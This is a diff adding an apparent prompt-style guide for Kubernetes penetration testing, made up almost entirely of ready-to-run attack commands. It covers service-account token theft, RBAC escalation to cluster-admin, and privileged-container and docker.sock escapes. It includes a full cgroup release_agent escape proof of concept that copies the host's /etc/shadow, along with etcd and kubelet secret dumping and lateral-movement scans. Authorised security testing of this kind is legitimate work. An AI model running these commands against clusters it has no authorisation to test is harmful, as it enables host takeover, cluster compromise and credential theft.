@@ -1,0 +1,675 @@
+<kubernetes_escape_guide>
+<title>KUBERNETES SECURITY TESTING AND CONTAINER ESCAPE</title>
+
+<critical>Kubernetes environments require specialized testing for container escape, service account abuse, RBAC misconfiguration, privileged container attacks, node compromise, and secrets enumeration. Focus on breaking out of container isolation and achieving cluster-wide access.</critical>
+
+<scope>
+- Container escape techniques (privileged, hostPath, hostPID, hostNetwork)
+- Service account token abuse and privilege escalation
+- RBAC misconfiguration exploitation
+- Privileged container and capability attacks
+- Node-level compromise and lateral movement
+- Secrets enumeration and extraction
+- Kubernetes API server exploitation
+- Pod security policy bypass
+- Network policy circumvention
+</scope>
+
+<methodology>
+1. Enumerate Kubernetes environment (version, RBAC, service accounts)
+2. Extract and test service account tokens
+3. Probe Kubernetes API for accessible resources
+4. Identify escape vectors (privileged pods, hostPath mounts, etc.)
+5. Test RBAC permissions and potential escalation paths
+6. Enumerate secrets and configmaps
+7. Attempt node access via kubelet or SSH
+8. Test lateral movement to other pods/namespaces
+</methodology>
+
+<environment_enumeration>
+<detection>
+{% raw %}
+# Detect if running in Kubernetes
+
+# Check for service account token
+ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Check environment variables
+env | grep KUBERNETES
+# KUBERNETES_SERVICE_HOST=10.96.0.1
+# KUBERNETES_SERVICE_PORT=443
+
+# Check for .dockerenv or cgroup
+ls -la /.dockerenv
+cat /proc/1/cgroup | grep -i kube
+cat /proc/self/cgroup | grep -i kube
+
+# DNS discovery
+nslookup kubernetes.default.svc.cluster.local
+nslookup kubernetes.default
+
+# Check mounted secrets
+mount | grep secret
+df | grep secret
+{% endraw %}
+</detection>
+
+<version_discovery>
+{% raw %}
+# Identify Kubernetes version
+
+# Via API server
+curl -k https://kubernetes.default.svc/version
+curl -k https://$KUBERNETES_SERVICE_HOST/version
+
+# From kubelet (if accessible)
+curl -k https://localhost:10250/version
+curl -k https://<node-ip>:10250/version
+
+# Check manifests
+cat /etc/kubernetes/manifests/*.yaml 2>/dev/null
+
+# Container runtime
+docker --version 2>/dev/null
+crictl --version 2>/dev/null
+containerd --version 2>/dev/null
+{% endraw %}
+</version_discovery>
+</environment_enumeration>
+
+<service_account_abuse>
+<token_extraction>
+{% raw %}
+# Extract service account token
+
+# Default location
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Display token
+echo $TOKEN
+
+# Decode JWT (base64 decode middle section)
+echo $TOKEN | cut -d '.' -f2 | base64 -d 2>/dev/null | jq .
+
+# Token includes:
+# - Service account name
+# - Namespace
+# - Expiration
+# - Kubernetes API audience
+{% endraw %}
+</token_extraction>
+
+<api_access>
+{% raw %}
+# Test API access with service account token
+
+# Basic API call
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1
+
+# List pods in current namespace
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods
+
+# List all pods (if permitted)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/pods
+
+# List secrets in namespace
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets
+
+# List all secrets (if permitted)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/secrets
+
+# List nodes (usually admin only)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/nodes
+
+# Create pod (privilege escalation attempt)
+curl -k -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
+  -d @privileged-pod.json
+{% endraw %}
+</api_access>
+
+<permission_enumeration>
+{% raw %}
+# Enumerate RBAC permissions
+
+# Using kubectl (if available)
+kubectl auth can-i --list
+kubectl auth can-i get pods
+kubectl auth can-i create pods
+kubectl auth can-i get secrets
+kubectl auth can-i --list --all-namespaces
+
+# Via API (using token)
+# Check specific verb/resource
+curl -k -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
+  -d '{
+    "apiVersion": "authorization.k8s.io/v1",
+    "kind": "SelfSubjectAccessReview",
+    "spec": {
+      "resourceAttributes": {
+        "namespace": "'$NAMESPACE'",
+        "verb": "create",
+        "resource": "pods"
+      }
+    }
+  }'
+
+# Test various permissions:
+# - get/list/watch pods, secrets, configmaps
+# - create/update/delete pods
+# - exec into pods
+# - get/update nodes
+# - create clusterrolebindings (privilege escalation)
+
+# Automated enumeration script
+for resource in pods secrets configmaps services nodes; do
+  for verb in get list create delete; do
+    echo "Testing $verb $resource"
+    # Run selfsubjectaccessreview
+  done
+done
+{% endraw %}
+</permission_enumeration>
+
+<privilege_escalation>
+{% raw %}
+# Escalate privileges via RBAC
+
+# If can create pods:
+# Deploy privileged pod (see container escape section)
+
+# If can create rolebindings:
+curl -k -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings \
+  -d '{
+    "apiVersion": "rbac.authorization.k8s.io/v1",
+    "kind": "RoleBinding",
+    "metadata": {"name": "escalate"},
+    "roleRef": {
+      "apiGroup": "rbac.authorization.k8s.io",
+      "kind": "ClusterRole",
+      "name": "cluster-admin"
+    },
+    "subjects": [{
+      "kind": "ServiceAccount",
+      "name": "default",
+      "namespace": "'$NAMESPACE'"
+    }]
+  }'
+
+# If can create clusterrolebindings (instant cluster-admin):
+curl -k -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
+  -d '{
+    "apiVersion": "rbac.authorization.k8s.io/v1",
+    "kind": "ClusterRoleBinding",
+    "metadata": {"name": "escalate-cluster"},
+    "roleRef": {
+      "apiGroup": "rbac.authorization.k8s.io",
+      "kind": "ClusterRole",
+      "name": "cluster-admin"
+    },
+    "subjects": [{
+      "kind": "ServiceAccount",
+      "name": "default",
+      "namespace": "'$NAMESPACE'"
+    }]
+  }'
+
+# If can impersonate users/groups:
+curl -k -H "Authorization: Bearer $TOKEN" \
+  -H "Impersonate-User: admin" \
+  -H "Impersonate-Group: system:masters" \
+  https://kubernetes.default.svc/api/v1/pods
+{% endraw %}
+</privilege_escalation>
+</service_account_abuse>
+
+<container_escape>
+<privileged_container>
+{% raw %}
+# Privileged containers have all capabilities
+# Can access host resources directly
+
+# Check if running privileged
+cat /proc/self/status | grep CapEff
+# CapEff: 000001ffffffffff = privileged
+
+# Or check securityContext in pod spec (if accessible)
+
+# Escape techniques from privileged container:
+
+# 1. Mount host filesystem
+mkdir /mnt/host
+mount /dev/sda1 /mnt/host  # Adjust device
+chroot /mnt/host
+
+# 2. Access host processes
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+# Enter namespace of PID 1 (host init)
+
+# 3. Load kernel module
+insmod /path/to/malicious.ko
+
+# 4. Direct device access
+mknod /dev/sda1 b 8 1
+mount /dev/sda1 /mnt
+
+# 5. Abuse cgroup release_agent
+# (Advanced technique for container escape)
+{% endraw %}
+</privileged_container>
+
+<hostpath_mounts>
+{% raw %}
+# hostPath mounts expose host directories
+
+# Check mounted volumes
+mount | grep -v 'overlay\|tmpfs\|proc\|sys'
+df -h
+
+# Common dangerous mounts:
+# /var/run/docker.sock - Docker socket
+# /proc - Host proc filesystem
+# / - Entire host root
+# /etc - Host config
+# /var/lib/kubelet - Kubelet data
+
+# Docker socket abuse:
+# If /var/run/docker.sock mounted
+ls -la /var/run/docker.sock
+
+# List containers on host
+docker -H unix:///var/run/docker.sock ps
+
+# Run privileged container on host
+docker -H unix:///var/run/docker.sock run -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+
+# Or simpler escape:
+docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
+
+# Host proc mounted:
+# If /proc mounted from host
+ls -la /proc/*/root  # Access host filesystem via process root dirs
+cat /proc/1/root/etc/shadow  # Read host files
+
+# Entire host root mounted:
+# If / mounted to /host or similar
+chroot /host
+# Now operating on host filesystem
+{% endraw %}
+</hostpath_mounts>
+
+<hostpid_hostnetwork>
+{% raw %}
+# hostPID allows seeing host processes
+# hostNetwork uses host network namespace
+
+# Check if hostPID enabled
+ps aux | head
+# If shows host processes (not just container) -> hostPID
+
+# With hostPID:
+# Can see all host processes
+ps aux | grep -i kube
+ps aux | grep -i etcd
+
+# Can access /proc of host processes
+ls -la /proc/1  # Host init process
+cat /proc/1/environ  # Environment of host process
+cat /proc/<pid>/cmdline  # Command line of any host process
+
+# Steal credentials from process memory
+gdb -p <pid>
+(gdb) generate-core-file /tmp/core
+# Analyze core dump for secrets
+
+# Or use:
+grep -a 'password\|secret\|token' /proc/<pid>/environ
+
+# hostNetwork:
+# Container shares host network namespace
+# Can sniff traffic
+tcpdump -i any -w /tmp/capture.pcap
+
+# Can bind to host ports
+nc -l -p 22  # Bind to SSH port on host
+{% endraw %}
+</hostpid_hostnetwork>
+
+<capability_abuse>
+{% raw %}
+# Linux capabilities
+
+# Check current capabilities
+capsh --print
+cat /proc/self/status | grep Cap
+
+# Dangerous capabilities:
+
+# CAP_SYS_ADMIN (almost root)
+# Can mount filesystems
+mount -t tmpfs none /mnt
+mount /dev/sda1 /mnt
+
+# CAP_SYS_PTRACE
+# Can ptrace and inject into host processes
+gdb -p 1  # Attach to init
+
+# CAP_SYS_MODULE
+# Can load kernel modules
+insmod malicious.ko
+
+# CAP_DAC_READ_SEARCH
+# Bypass file read permission checks
+# Can read any file on host (if filesystem mounted)
+
+# CAP_NET_ADMIN
+# Network configuration
+# Can sniff all traffic
+
+# CAP_SYS_BOOT
+# Can reboot host
+
+# Check pod security context for capabilities
+# Via API if accessible
+{% endraw %}
+</capability_abuse>
+
+<cgroup_escape>
+{% raw %}
+# cgroup release_agent escape (classic container escape)
+
+# Requirements:
+# - Privileged container or CAP_SYS_ADMIN
+# - cgroup v1
+
+# Technique:
+# 1. Create new cgroup
+# 2. Set release_agent to malicious script
+# 3. Trigger release_agent execution on host
+
+# PoC:
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "cat /etc/shadow > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+# output file on host will contain /etc/shadow
+
+# Modern kernels have mitigations
+# But still works in many environments
+{% endraw %}
+</cgroup_escape>
+</container_escape>
+
+<secrets_enumeration>
+<secret_discovery>
+{% raw %}
+# Find secrets in various locations
+
+# 1. Kubernetes secrets (via API)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets
+
+# List all secrets in all namespaces (if permitted)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/secrets
+
+# Get specific secret
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets/<secret-name>
+
+# Secrets are base64 encoded in API response
+echo "<base64_value>" | base64 -d
+
+# 2. Environment variables
+env | grep -i 'password\|secret\|key\|token\|api'
+
+# 3. Mounted secrets
+find / -name "*.key" -o -name "*.pem" -o -name "*.crt" 2>/dev/null
+find /var/run/secrets -type f 2>/dev/null
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# 4. ConfigMaps (may contain secrets)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/configmaps
+
+# 5. Application config files
+find / -name "config.*" -o -name "*.config" -o -name "*.conf" 2>/dev/null | grep -v proc
+cat /app/config.yaml
+cat /app/.env
+
+# 6. Process command lines (if hostPID)
+cat /proc/*/cmdline | strings | grep -i 'password\|secret\|key'
+
+# 7. Process environment (if hostPID)
+cat /proc/*/environ | strings | grep -i 'password\|secret\|key'
+{% endraw %}
+</secret_discovery>
+
+<etcd_access>
+{% raw %}
+# etcd stores all Kubernetes data (secrets in plaintext)
+
+# etcd is critical target
+# Usually on port 2379 (client) and 2380 (peer)
+
+# Check if etcd accessible
+curl https://127.0.0.1:2379/version
+curl https://<master-ip>:2379/version
+
+# With credentials (if found):
+# etcdctl (if available)
+export ETCDCTL_API=3
+etcdctl --endpoints=https://127.0.0.1:2379 \
+  --cert=/etc/kubernetes/pki/etcd/peer.crt \
+  --key=/etc/kubernetes/pki/etcd/peer.key \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  get / --prefix --keys-only
+
+# Get all secrets
+etcdctl get /registry/secrets --prefix
+
+# Without credentials (if no auth):
+curl https://127.0.0.1:2379/v2/keys/registry/secrets
+
+# etcd backup file (may be readable):
+# /var/lib/etcd/
+# Restore locally to browse secrets
+{% endraw %}
+</etcd_access>
+</secrets_enumeration>
+
+<node_access>
+<kubelet_exploitation>
+{% raw %}
+# kubelet API exploitation
+
+# kubelet ports:
+# 10250 - HTTPS (API)
+# 10255 - HTTP (read-only, deprecated)
+# 10248 - healthz
+
+# Unauthenticated kubelet (misconfiguration):
+curl -k https://<node-ip>:10250/pods
+curl -k https://<node-ip>:10250/metrics
+
+# List pods on node
+curl -k https://<node-ip>:10250/pods | jq .
+
+# Execute command in pod
+curl -k -X POST \
+  "https://<node-ip>:10250/run/<namespace>/<pod>/<container>" \
+  -d "cmd=id"
+
+# Or using kubectl-node-shell equivalent:
+curl -k -X POST \
+  "https://<node-ip>:10250/run/kube-system/kube-proxy-xxxx/kube-proxy" \
+  -d "cmd=nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
+
+# Read-only port (if enabled):
+curl http://<node-ip>:10255/pods
+curl http://<node-ip>:10255/stats
+
+# With authentication (stolen credentials):
+curl -k --cert client.crt --key client.key \
+  https://<node-ip>:10250/pods
+{% endraw %}
+</kubelet_exploitation>
+
+<node_shell_access>
+{% raw %}
+# Gain shell on Kubernetes node
+
+# Via privileged pod (if can create):
+kubectl run shell --rm -it --image=alpine --privileged \
+  --overrides='{"spec":{"hostPID":true,"hostNetwork":true}}' \
+  -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+
+# Via kubectl node-shell (if kubectl available):
+kubectl node-shell <node-name>
+
+# Via SSH (if keys found):
+ssh -i /path/to/key user@<node-ip>
+
+# Via kubelet exec (see above)
+
+# Once on node:
+# - Access all container filesystems
+# - Read all secrets
+# - Modify workloads
+# - Pivot to other nodes
+{% endraw %}
+</node_shell_access>
+</node_access>
+
+<lateral_movement>
+<pod_to_pod>
+{% raw %}
+# Move between pods
+
+# Network scan
+nmap -p 1-65535 10.244.0.0/16  # Pod network (example)
+nmap -p 1-65535 10.96.0.0/12   # Service network (example)
+
+# Service discovery
+nslookup kubernetes.default.svc.cluster.local
+nslookup <service-name>.<namespace>.svc.cluster.local
+
+# Access other pods' services
+curl http://<pod-ip>:<port>
+curl http://<service-name>.<namespace>.svc.cluster.local:<port>
+
+# If network policies allow:
+# Try to access services in other namespaces
+curl http://<service>.kube-system.svc.cluster.local
+
+# Pod-to-pod direct communication (if no network policy)
+curl http://<target-pod-ip>:<port>
+
+# Try common ports:
+# 22 (SSH), 80/443 (HTTP), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB)
+{% endraw %}
+</pod_to_pod>
+
+<namespace_to_namespace>
+{% raw %}
+# Access resources in other namespaces
+
+# Via API (if permissions allow):
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/kube-system/pods
+
+# Via service DNS:
+curl http://service-name.other-namespace.svc.cluster.local
+
+# Create resources in other namespaces (if allowed):
+curl -k -X POST \
+  -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/kube-system/pods \
+  -d @pod.json
+
+# Target high-value namespaces:
+# - kube-system (system components)
+# - kube-public (public data)
+# - default (common workloads)
+# - monitoring namespaces (Prometheus, Grafana)
+{% endraw %}
+</namespace_to_namespace>
+</lateral_movement>
+
+<validation>
+1. Demonstrate container escape (access host filesystem)
+2. Extract and use service account token
+3. Show RBAC privilege escalation (gain cluster-admin)
+4. Extract secrets from Kubernetes API
+5. Achieve node-level access (shell on node)
+6. Prove lateral movement (access other pods/namespaces)
+7. Document all commands and API calls used
+8. Show before/after permissions and access level
+</validation>
+
+<false_positives>
+- Non-privileged pods with restrictive security contexts
+- Properly configured RBAC with least privilege
+- Pod Security Policies/Pod Security Standards enforced
+- Network policies restricting pod-to-pod communication
+- Service account tokens with minimal permissions
+- Secrets properly encrypted at rest
+- Node access restricted and hardened
+- Kubelet authentication and authorization enabled
+</false_positives>
+
+<impact>
+- Container escape to host
+- Cluster-wide compromise (cluster-admin access)
+- Secrets exposure (credentials, API keys, certificates)
+- Data exfiltration from all pods
+- Lateral movement across namespaces
+- Node compromise and persistence
+- Denial of service (resource deletion)
+- Cryptomining or other resource abuse
+</impact>
+
+<pro_tips>
+1. Always extract and test service account token first
+2. Check for privileged pods or excessive capabilities
+3. hostPath mounts of / or /var/run/docker.sock are critical
+4. RBAC misconfiguration is extremely common
+5. Target kube-system namespace for high-value secrets
+6. etcd access provides complete cluster compromise
+7. Kubelet on port 10250 often has weak/no authentication
+8. Network policies are often not enforced
+9. Secrets in environment variables are easily accessible
+10. Container escape is easier with CAP_SYS_ADMIN
+11. Look for mounted cloud provider credentials
+12. Check for CI/CD secrets in CI namespaces
+13. Pod Security Policies are deprecated—check Pod Security Standards
+14. Service account automounting can be disabled—check each pod
+15. Node shell access provides ultimate control
+</pro_tips>
+
+<remember>Kubernetes security is only as strong as its weakest configuration. Service account tokens provide API access—always test their permissions. Privileged pods are immediate escape vectors. hostPath mounts create direct host access. RBAC is frequently misconfigured with overly permissive roles. Secrets are not encrypted by default in etcd. Network policies are optional and often missing. Container escape techniques are well-documented and reliable. Node access provides full cluster compromise. Always escalate from pod → node → cluster systematically. The default service account often has more permissions than intended.</remember>
+</kubernetes_escape_guide>
